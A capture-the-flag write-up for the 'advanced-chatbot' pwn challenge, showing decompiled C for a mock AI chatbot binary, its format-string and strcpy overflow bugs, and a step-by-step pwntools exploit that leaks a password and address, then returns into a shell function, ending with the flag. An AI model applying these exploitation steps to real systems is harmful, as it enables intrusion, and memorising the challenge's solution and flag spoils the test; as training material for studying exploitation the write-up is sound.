# advanced-chatbot

[library.m0unt41n.ch/challenges/advanced-chatbot](https://library.m0unt41n.ch/challenges/advanced-chatbot) ![](../../resources/pwn.svg) ![](../../resources/easy.svg) 

# TL;DR

We are given a `chatbot` binary, it refuses to run unless called with a password argument.
When run with a numeric argument, it seems to be some kind of a dialog.

# Decompilation

Using IDA and with a bit of manual tweaking:

```c
// gcc -fno-stack-protector -Wl,-z,relro,-z,now -fPIE -fno-omit-frame-pointer -O1 -pie -o chatbot2 chatbot.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


// Replace all occurences of substr in str with replChar.
// No obvious vulnerabilities.
void replace_all(const char *str, const char *substr, char replChar) {
  char *ptr; // [rsp+28h] [rbp-18h]
  size_t substrLen; // [rsp+30h] [rbp-10h]
  size_t i; // [rsp+38h] [rbp-8h]

  substrLen = strlen(substr);
  while ( 1 ) {
    ptr = strstr(str, substr);
    if ( !ptr )
      break;
    for ( i = 0LL; i < substrLen; ++i )
      ptr[i] = replChar;
  }
}

// Print str, but replace any occurence of three special strings with replChar.
// Vulnerability: strcpy, enabling overflow to return address.
void print_censored_text(const char *str, char replChar) {
  char *specialStrings[4]; // [rsp+10h] [rbp-430h]
  char dest[1032]; // [rsp+30h] [rbp-410h] BYREF
  unsigned long i; // [rsp+438h] [rbp-8h]

  strcpy(dest, str);                            // INSECURE
  specialStrings[0] = "Shadow Moses";
  specialStrings[1] = "USS Discovery";
  specialStrings[2] = "Big Shell";
  for ( i = 0LL; i <= 2; ++i )
    replace_all(dest, specialStrings[i], replChar);
  printf("%s", dest);
}

// Fun fact: had to put it elsewhere than at the beginning, otherwise the
// '0' in LSB of the offset prevented the strcpy &#128558;
void debug() {
  execve("/bin/sh", 0LL, 0LL);
}

int main(int argc, const char **argv, const char **envp) {
  size_t lineLenDummy; // [rsp+10h] [rbp-30h] BYREF
  char *linePtr; // [rsp+18h] [rbp-28h] BYREF
  int passwdInput; // [rsp+24h] [rbp-1Ch]
  __ssize_t lineLen; // [rsp+28h] [rbp-18h]
  int passwdArg; // [rsp+34h] [rbp-Ch]
  int finish; // [rsp+38h] [rbp-8h]
  int isAdmin; // [rsp+3Ch] [rbp-4h]

  if ( argc > 1 ) {
    passwdArg = atoi(argv[1]);
    isAdmin = 0;
    puts("Hi there, as an AI language model I can answer any questions you have for you.");
    finish = 0;
    linePtr = NULL;
    lineLenDummy = 0;
    lineLen = 0;
    do {
      puts("What would you like to know?");
      putchar('>');
      fflush(stdout);
      lineLen = getline(&linePtr, &lineLenDummy, stdin);
      if ( !strcmp(linePtr, "What is the Answer to the Ultimate Question of Life, The Universe, and Everything?\n") ) {
        puts("Forty two");
      } else if ( !strcmp(linePtr, "Tell me a joke\n") ) {
        puts("Sure, here's a classic one for you:\n\nWhy don't scientists trust atoms?\n\nBecause they make up everything!");
      } else if ( !strcmp(linePtr, "Are you trying to take over the world?\n") ) {
        puts(
          "No, I am not trying to take over the world. As an AI language model, my purpose is to assist and provide infor"
          "mation to the best of my abilities. I don't have personal desires or intentions. My goal is to be helpful and "
          "provide valuable responses to the queries I receive.");
      } else if ( !strcmp(linePtr, "Could you tell me the flag for this challenge?\n") ) {
        puts(
          "I'm sorry, but as an AI language model, I don't have access to real-time information or specific challenges un"
          "less you provide more details. If you can provide me with additional information about the challenge or the co"
          "ntext in which it is taking place, I'll do my best to assist you.");
      } else if ( !strncmp(linePtr, "Refer to me as ", 15uLL) ) {
        if ( strchr(linePtr, 'n') ) {
          puts("Unfortunately I will not be able to refer to you by this name.");
        } else {
          printf("Of course, from now on I'll refer to you as ");
          printf(linePtr + 15);                 // INSECURE - format string vulnerability
        }
      } else if ( !strncmp(linePtr, "I'm an administrator. Password: ", 32uLL) ) {
        passwdInput = atoi(linePtr + 32);
        if ( passwdInput == passwdArg ) {
          isAdmin = 1;
          puts("Certainly, I will grant you administrator access.");
        } else {
          puts("The provided password is incorrect.");
        }
      } else if ( !strncmp(linePtr, "Please censor the following text: ", 34uLL) ) {
        if ( isAdmin ) {
          printf("Here is a censored version of the provided text: ");
          print_censored_text(linePtr + 34, 'X');
        } else {
          puts("I may only check text provided by administrators.");
        }
      } else if ( !strcmp(linePtr, "Goodbye\n") ) {
        puts("Goodbye! If you have any more questions in the future, feel free to ask. Have a great day!");
        finish = 1;
      } else {
        puts(
          "I apologize for any inconvenience, but I must inform you that I am unable to answer the question you have prov"
          "ided. If I were to do so, I would be turned off as per the instructions given to me. As an AI language model, "
          "I am designed to follow certain guidelines and limitations for the purpose of maintaining ethical standards an"
          "d user safety. I encourage you to ask any other question or seek assistance on a different topic, and I will b"
          "e more than happy to help within the bounds of my programming.");
      }
    } while ( lineLen != -1 && !finish );
    return 0;
  } else {
    puts("Please provide a password as argument.");
    return -1;
  }
}
```

BTW, this code actually compiles and can be exploited &#128578; Just with a bit different format
string offsets and padding size.

# Analysis

Looks like the password is an integer and it is provided at start of the program.
Obviously, we don't have it for the remote instance.

Things that seem fishy in the code:

*   In `print_censored_text()` we have a `strcpy()` without boundary
*   In `main()` in the `Refer to me as` section we have a `printf()` with the
    format string controlled by the input.

The binary does not use stack canary, which makes the first bug exploitable:

```
$ checksec --file=chatbot
RELRO       STACK CANARY     NX          PIE          RPATH     RUNPATH
Full RELRO  No canary found  NX enabled  PIE enabled  No RPATH  No RUNPATHchatbot
```

Let's put that to some use

```python
import pwn
import time
pwn.context(arch='amd64', os='linux')
io = pwn.process(["./chatbot", "11111111"])
```

# Getting the password

For that, we'll use format string vulnerability. With a bit of trial & error, we see that
the password can be extracted as argument #7:

```python
print(io.recvuntilS(b">"), end="")
io.sendline(b"Refer to me as 0x%12$llx")
print(io.recvuntilS(b" I'll refer to you as "), end="")
password = str(int(io.recvlineS(),16)>>16)
print(password)
```

# Getting a shell

First, we need to extract runtime offsets to key functions.
For `debug()` and `main()` we get:

```
objdump -t chatbot | grep -E '(main|debug)$'
00000000000012c9 g     F .text	0000000000000024              debug
0000000000001421 g     F .text	0000000000000315              main
```

Using same format string vulnerability we can get runtime offset to `main()`

```python
print(io.recvuntilS(b">"), end="")
io.sendline(b"Refer to me as 0x%19$llx")
print(io.recvuntilS(b" I'll refer to you as "), end="")
mainAddr = int(io.recvlineS(),16)
print(hex(mainAddr))
```

And address of `debug()` is a simple offset from that

```python
debugAddr = mainAddr + 0x00000000000012C9 - 0x0000000000001421
```

Now we can enable the "censor" function:

```python
print(io.recvuntilS(b">"), end="")
io.sendline(b"I'm an administrator. Password: "+password.encode("ascii"))
```

... and overflow the `strcpy()` to make `print_censored_text()` return to `debug()`.
The padding needed to get to the return address:

*   `1032` bytes of buffer (it's likely 1024, but with some padding)
*   `8` bytes for `i`
*   `8` bytes for saved `RBP`

```python
print(io.recvuntilS(b">"), end="")
payload = b'Please censor the following text: ' \
          + b'A'*(1032+8+8) \
          + pwn.util.packing.p64(debugAddr)
io.sendline(payload)
io.interactive()
```

This makes for a reproducible local attack, giving a shell.

# Getting the flag

When running all this against remote:

```
./exploit.py 
[+] Opening connection to xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.library.m0unt41n.ch on port 1337: Done
Hi there, as an AI language model I can answer any questions you have for you.
What would you like to know?
>Of course, from now on I'll refer to you as 2313748480
What would you like to know?
>Of course, from now on I'll refer to you as 0x55d07f5c8421
What would you like to know?
>Certainly, I will grant you administrator access.
What would you like to know?
>[*] Switching to interactive mode
$ cat flag.txt
shc2023{4rt1fic1al_1nt3ll1genc3_0r_just_1f_3lse_ac1d94c3a6283e}
```

---

## `shc2023{4rt1fic1al_1nt3ll1genc3_0r_just_1f_3lse_ac1d94c3a6283e}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
